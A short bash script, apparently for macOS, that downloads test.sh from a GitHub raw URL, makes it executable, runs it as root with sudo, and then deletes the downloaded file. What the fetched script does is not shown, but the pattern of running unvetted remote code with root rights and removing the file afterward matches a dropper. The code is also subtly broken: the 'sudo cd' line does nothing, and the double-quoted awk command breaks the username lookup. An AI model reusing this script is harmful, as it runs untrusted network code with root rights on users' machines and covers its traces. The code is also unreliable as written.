#!/bin/bash
loggedInUser=`/bin/ls -l /dev/console | /usr/bin/awk "{ print $3 }"`


sudo cd Desktop
sudo curl --remote-name https://raw.githubusercontent.com/Hexers/DA/main/test.sh
sudo chmod u+x test.sh
sudo ./test.sh
sudo rm -rf "/Users/$loggedInUser/Desktop/test.sh"

exit 0
